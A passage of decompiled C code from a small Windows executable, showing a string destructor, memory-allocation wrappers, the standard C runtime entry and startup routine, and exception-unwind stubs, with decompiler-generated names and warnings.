      param_2 = param_2 + 1;
      *param_1 = uVar2;
      param_1 = param_1 + 1;
    }
  }
  return;
}



void FUN_00401860(void)

{
  return;
}



void * __thiscall FUN_00401870(void *this,byte param_1)

{
  char cVar1;
  int iVar2;
  
  iVar2 = *(int *)((int)this + 4);
  if (iVar2 != 0) {
    cVar1 = *(char *)(iVar2 + -1);
    if ((cVar1 == '\0') || (cVar1 == -1)) {
      FUN_004018d0((void *)(iVar2 + -2));
    }
    else {
      *(char *)(iVar2 + -1) = cVar1 + -1;
    }
  }
  *(undefined4 *)((int)this + 4) = 0;
  *(undefined4 *)((int)this + 8) = 0;
  *(undefined4 *)((int)this + 0xc) = 0;
  if ((param_1 & 1) != 0) {
    FUN_004018d0(this);
  }
  return this;
}



void __cdecl FUN_004018d0(void *param_1)

{
  free(param_1);
  return;
}



void * __cdecl operator_new(uint param_1)

{
  void *pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x004018f0. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = operator_new(param_1);
  return pvVar1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void entry(void)

{
  undefined4 *puVar1;
  byte *pbVar2;
  char **local_74;
  _startupinfo local_70;
  int local_6c;
  char **local_68;
  int local_64;
  _STARTUPINFOA local_60;
  undefined1 *local_1c;
  void *pvStack_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &DAT_004020a8;
  puStack_10 = &DAT_00401a7c;
  pvStack_14 = ExceptionList;
  local_1c = &stack0xffffff78;
  local_8 = 0;
  ExceptionList = &pvStack_14;
  __set_app_type(2);
  _DAT_00403084 = 0xffffffff;
  _DAT_00403088 = 0xffffffff;
  puVar1 = (undefined4 *)__p__fmode();
  *puVar1 = DAT_00403080;
  puVar1 = (undefined4 *)__p__commode();
  *puVar1 = DAT_0040307c;
  _DAT_0040308c = *(undefined4 *)_adjust_fdiv_exref;
  FUN_00401a7b();
  if (DAT_00403070 == 0) {
    __setusermatherr(&LAB_00401a78);
  }
  FUN_00401a66();
  initterm(&DAT_00403008,&DAT_0040300c);
  local_70.newmode = DAT_00403078;
  __getmainargs(&local_64,&local_74,&local_68,DAT_00403074,&local_70);
  initterm(&DAT_00403000,&DAT_00403004);
  pbVar2 = *(byte **)_acmdln_exref;
  if (*pbVar2 != 0x22) {
    do {
      if (*pbVar2 < 0x21) goto LAB_004019e9;
      pbVar2 = pbVar2 + 1;
    } while( 1 );
  }
  do {
    pbVar2 = pbVar2 + 1;
    if (*pbVar2 == 0) break;
  } while (*pbVar2 != 0x22);
  if (*pbVar2 != 0x22) goto LAB_004019e9;
  do {
    pbVar2 = pbVar2 + 1;
LAB_004019e9:
  } while ((*pbVar2 != 0) && (*pbVar2 < 0x21));
  local_60.dwFlags = 0;
  GetStartupInfoA(&local_60);
  GetModuleHandleA((LPCSTR)0x0);
  local_6c = FUN_004012c0();
                    // WARNING: Subroutine does not return
  exit(local_6c);
}



void __cdecl free(void *_Memory)

{
                    // WARNING: Could not recover jumptable at 0x00401a54. Too many branches
                    // WARNING: Treating indirect jump as call
  free(_Memory);
  return;
}



int __cdecl _XcptFilter(ulong _ExceptionNum,_EXCEPTION_POINTERS *_ExceptionPtr)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401a5a. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = _XcptFilter(_ExceptionNum,_ExceptionPtr);
  return iVar1;
}



void __cdecl initterm(void)

{
                    // WARNING: Could not recover jumptable at 0x00401a60. Too many branches
                    // WARNING: Treating indirect jump as call
  initterm();
  return;
}



void FUN_00401a66(void)

{
  _controlfp(0x10000,0x30000);
  return;
}



void FUN_00401a7b(void)

{
  return;
}



uint __cdecl _controlfp(uint _NewValue,uint _Mask)

{
  uint uVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401a82. Too many branches
                    // WARNING: Treating indirect jump as call
  uVar1 = _controlfp(_NewValue,_Mask);
  return uVar1;
}



void Unwind_00401a90(void)

{
  int unaff_EBP;
  
  FUN_00401360(unaff_EBP + -0x68c);
  return;
}



void Unwind_00401a9b(void)

{
  int unaff_EBP;
  
                    // WARNING: Could not recover jumptable at 0x00401aa1. Too many branches
                    // WARNING: Treating indirect jump as call
  std::basic_string<>::~basic_string<>((basic_string<> *)(unaff_EBP + -0x67c));
  return;
}



void Unwind_00401ac0(void)

{
  FUN_00401860();
  return;
}


